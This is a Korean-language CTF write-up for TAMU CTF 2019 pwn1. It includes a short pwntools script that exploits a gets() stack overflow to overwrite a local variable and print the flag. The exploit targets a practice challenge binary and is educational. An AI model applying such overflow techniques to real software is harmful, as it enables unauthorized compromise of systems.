# [TAMU CTF 2019] pwn1 풀이

- checksec을 통해  보호기법 확인하기

![image](https://user-images.githubusercontent.com/59410565/117538447-31cfd900-b041-11eb-9b26-7445bedf9b31.png)

32bit 파일이고 Full RELRO, NX와 PIE가 적용되어 있다. 즉, bss 영역을 제외한 모든 부분에서 write 권한이 없어지고, 쉘의 실행을 방지한다. 또한  바이너리의 주소를 랜덤호하하여 바이너리의 특정 주소의 값을 수정하는 것과 같은 공격을 방지하고 있다. 



- IDA를 사용하여 pwn1 살펴보기

// main() 함수

![image](https://user-images.githubusercontent.com/59410565/117539384-57f77800-b045-11eb-81ec-ae6c301fb65e.png)

// print_flag()

![image](https://user-images.githubusercontent.com/59410565/117540015-2338f000-b048-11eb-8ab5-d1ca4714f1c2.png)

s의 크기는 0x3B(59), v5의 크기는 0x10(16)이다. v5의 값이 0xDEA110C8과 같아지면 답을 얻을 수 있다. 즉, strcmp()를 통해 if문을 통과한 뒤, v5에 0xDEA110C8이 들어있어야 한다. gets() 함수의 stack overflow 취약점을 이용하여 v5의 값을 바꿀 수 있을 것 같다.



- Exploit

```python
from pwn import *

p = process("./pwn1")

p.sendafter("What... is your name?","Sir Lancelot of Camelot\n")
p.sendafter("What... is your quest?","To seek the Holy Grail.\n")

payload = 'A'*(0x3b-0x10) 
payload += p32(0xdea110c8)
p.sendafter("What... is my secret", payload)

p.interactive()
```



이와 같이 v5의 값을 바꾸는데 성공했다. 그러나 error가 발생한다.

![image-20210508215510147](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210508215510147.png)

> flag.txt 파일이 없어서 오류가 나는 것 같다. 근데 내 컴퓨터에 없는게 당연하기 때문에 넘어가기로 했다 ^_^

![image-20210508215739054](C:\Users\hyera\AppData\Roaming\Typora\typora-user-images\image-20210508215739054.png)

